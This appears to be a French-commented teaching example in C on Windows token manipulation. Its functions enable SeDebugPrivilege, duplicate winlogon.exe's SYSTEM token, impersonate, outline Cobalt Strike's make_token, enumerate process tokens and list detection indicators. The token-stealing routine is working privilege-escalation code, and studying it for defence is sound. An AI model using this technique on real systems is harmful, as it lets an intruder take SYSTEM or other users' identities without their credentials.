/*
 * OBJECTIF  : Manipulation avancee des tokens : impersonation, token stealing, make token
 * PREREQUIS : Module 09-Tokens-Privileges, OpenProcess, DuplicateTokenEx
 * COMPILE   : cl example.c /Fe:example.exe /link advapi32.lib
 *
 * Les tokens Windows representent l'identite d'un utilisateur.
 * L'impersonation permet d'emprunter l'identite d'un autre utilisateur
 * sans connaitre son mot de passe, en dupliquant son token.
 *
 * Techniques :
 * 1. Token stealing : voler le token d'un processus existant
 * 2. Token impersonation : s'executer sous l'identite d'un autre
 * 3. Make token : creer un token avec LogonUser
 * 4. Token du SYSTEM via service
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")

/* Afficher les infos d'un token */
void print_token_info(HANDLE hToken, const char* label) {
    /* Nom utilisateur */
    DWORD size = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
    TOKEN_USER* tu = (TOKEN_USER*)malloc(size);
    if (GetTokenInformation(hToken, TokenUser, tu, size, &size)) {
        char name[256] = {0}, domain[256] = {0};
        DWORD name_len = 256, domain_len = 256;
        SID_NAME_USE use;
        LookupAccountSidA(NULL, tu->User.Sid, name, &name_len, domain, &domain_len, &use);

        char* sid_str = NULL;
        ConvertSidToStringSidA(tu->User.Sid, &sid_str);

        printf("    [%s] %s\\%s (SID: %s)\n", label, domain, name,
               sid_str ? sid_str : "???");
        if (sid_str) LocalFree(sid_str);
    }
    free(tu);

    /* Niveau d'integrite */
    size = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &size);
    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)malloc(size);
    if (GetTokenInformation(hToken, TokenIntegrityLevel, tml, size, &size)) {
        DWORD il = *GetSidSubAuthority(tml->Label.Sid,
                    *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
        const char* il_str = "Unknown";
        if (il >= 0x4000) il_str = "System";
        else if (il >= 0x3000) il_str = "High";
        else if (il >= 0x2000) il_str = "Medium";
        else if (il >= 0x1000) il_str = "Low";
        printf("    [%s] Integrity: %s (0x%lX)\n", label, il_str, il);
    }
    free(tml);
}

/* Demo 1 : Afficher le token courant */
void demo_current_token(void) {
    printf("[1] Token du processus courant\n\n");

    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    print_token_info(hToken, "Current");

    /* Verifier si admin */
    TOKEN_ELEVATION elev;
    DWORD size;
    GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &size);
    printf("    [Current] Elevated: %s\n", elev.TokenIsElevated ? "YES" : "NO");

    CloseHandle(hToken);
    printf("\n");
}

/* Demo 2 : Token Stealing - dupliquer le token d'un autre processus */
void demo_token_stealing(void) {
    printf("[2] Token Stealing - Dupliquer le token d'un processus\n\n");

    /* Activer SeDebugPrivilege si possible */
    HANDLE hMyToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hMyToken);
    LUID luid;
    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hMyToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        if (GetLastError() == ERROR_SUCCESS)
            printf("    [+] SeDebugPrivilege active\n");
        else
            printf("    [*] SeDebugPrivilege non disponible (non-admin)\n");
    }
    CloseHandle(hMyToken);

    /* Trouver un processus cible (winlogon.exe = SYSTEM) */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD target_pid = 0;
    const char* target_name = "winlogon.exe";

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, target_name) == 0) {
                target_pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    if (!target_pid) {
        printf("    [-] %s non trouve\n\n", target_name);
        return;
    }
    printf("    [+] Cible : %s (PID %lu)\n", target_name, target_pid);

    /* Ouvrir le processus cible */
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProcess) {
        printf("    [-] OpenProcess echoue (err %lu)\n", GetLastError());
        printf("    [*] Necessite SeDebugPrivilege (admin)\n\n");
        return;
    }

    /* Obtenir son token */
    HANDLE hTargetToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hTargetToken)) {
        printf("    [-] OpenProcessToken echoue (err %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    printf("    [+] Token obtenu de %s\n", target_name);
    print_token_info(hTargetToken, "Stolen");

    /* Dupliquer le token en token d'impersonation */
    HANDLE hDupToken;
    if (DuplicateTokenEx(hTargetToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        printf("    [+] Token duplique avec succes\n");
        print_token_info(hDupToken, "Duplicated");

        /* On pourrait maintenant utiliser ImpersonateLoggedOnUser
           ou CreateProcessWithTokenW pour executer du code */
        printf("    [*] Ce token peut etre utilise avec :\n");
        printf("        - ImpersonateLoggedOnUser(hDupToken)\n");
        printf("        - CreateProcessWithTokenW(hDupToken, ...)\n");

        CloseHandle(hDupToken);
    }

    CloseHandle(hTargetToken);
    CloseHandle(hProcess);
    printf("\n");
}

/* Demo 3 : Impersonation - executer du code sous une autre identite */
void demo_impersonation(void) {
    printf("[3] Impersonation du token courant (demo self)\n\n");

    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);

    HANDLE hImpToken;
    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                      SecurityImpersonation, TokenImpersonation, &hImpToken);

    printf("    [Avant] Thread identity:\n");
    HANDLE hThreadToken;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {
        print_token_info(hThreadToken, "Thread");
        CloseHandle(hThreadToken);
    } else {
        printf("    [Thread] Pas de token thread (utilise le token process)\n");
    }

    /* Impersonate */
    if (ImpersonateLoggedOnUser(hImpToken)) {
        printf("    [+] Impersonation reussie\n");

        if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {
            print_token_info(hThreadToken, "Impersonated");
            CloseHandle(hThreadToken);
        }

        /* Revenir a l'identite originale */
        RevertToSelf();
        printf("    [+] RevertToSelf() - retour a l'identite originale\n");
    }

    CloseHandle(hImpToken);
    CloseHandle(hToken);
    printf("\n");
}

/* Demo 4 : Make Token - creer un token via LogonUser */
void demo_make_token(void) {
    printf("[4] Make Token - Creer un token via LogonUser\n\n");

    printf("    Principe :\n");
    printf("    LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, ...)\n");
    printf("    -> Cree un token sans valider le mot de passe localement\n");
    printf("    -> LOGON32_LOGON_NEW_CREDENTIALS : token pour acces reseau uniquement\n\n");

    printf("    Usage offensif (Cobalt Strike 'make_token') :\n");
    printf("    1. Obtenir des credentials (hash/password)\n");
    printf("    2. LogonUser avec LOGON32_LOGON_NEW_CREDENTIALS\n");
    printf("    3. ImpersonateLoggedOnUser(hToken)\n");
    printf("    4. Acceder aux ressources reseau sous cette identite\n\n");

    printf("    [Demo] LogonUser avec credentials locales :\n");

    /* Demo avec l'utilisateur courant (credentials non fournies = demo theorique) */
    printf("    [*] En reel : LogonUserA(\"admin\", \"DOMAIN\", \"password\",\n");
    printf("                   LOGON32_LOGON_NEW_CREDENTIALS,\n");
    printf("                   LOGON32_PROVIDER_DEFAULT, &hToken)\n");
    printf("    [*] Puis : ImpersonateLoggedOnUser(hToken)\n");
    printf("    [*] Le process local garde son identite, mais les acces reseau\n");
    printf("    [*] utilisent les nouveaux credentials\n\n");
}

/* Demo 5 : Enumerer les tokens accessibles */
void demo_enumerate_tokens(void) {
    printf("[5] Enumeration des tokens accessibles\n\n");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    int accessible = 0;

    if (Process32First(snap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProc) {
                HANDLE hToken;
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                    if (accessible < 10) {
                        DWORD size = 0;
                        GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
                        TOKEN_USER* tu = (TOKEN_USER*)malloc(size);
                        if (GetTokenInformation(hToken, TokenUser, tu, size, &size)) {
                            char name[256] = {0}, domain[256] = {0};
                            DWORD nl = 256, dl = 256;
                            SID_NAME_USE use;
                            LookupAccountSidA(NULL, tu->User.Sid, name, &nl, domain, &dl, &use);
                            printf("    [%lu] %-25s -> %s\\%s\n",
                                   pe.th32ProcessID, pe.szExeFile, domain, name);
                        }
                        free(tu);
                    }
                    accessible++;
                    CloseHandle(hToken);
                }
                CloseHandle(hProc);
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    if (accessible > 10)
        printf("    ... (%d de plus)\n", accessible - 10);
    printf("\n    [+] Total tokens accessibles : %d\n", accessible);
    printf("    [*] Avec SeDebugPrivilege, on peut acceder a TOUS les tokens\n\n");
}

/* Demo 6 : Detection */
void demo_detection(void) {
    printf("[6] Detection du token stealing/impersonation\n\n");

    printf("    Indicateurs :\n");
    printf("    - Event ID 4624 Logon Type 9 (NewCredentials) = make_token\n");
    printf("    - Sysmon Event ID 10 (ProcessAccess) avec DesiredAccess TOKEN_*\n");
    printf("    - DuplicateHandle sur des tokens privilegies\n");
    printf("    - Thread token different du process token (impersonation)\n");
    printf("    - CreateProcessWithTokenW depuis un processus non-attendu\n\n");
}

int main(void) {
    printf("[*] Demo : Token Manipulation - Impersonation & Stealing\n");
    printf("[*] ==========================================\n\n");

    demo_current_token();
    demo_token_stealing();
    demo_impersonation();
    demo_make_token();
    demo_enumerate_tokens();
    demo_detection();

    printf("[+] Exemple termine avec succes\n");
    return 0;
}
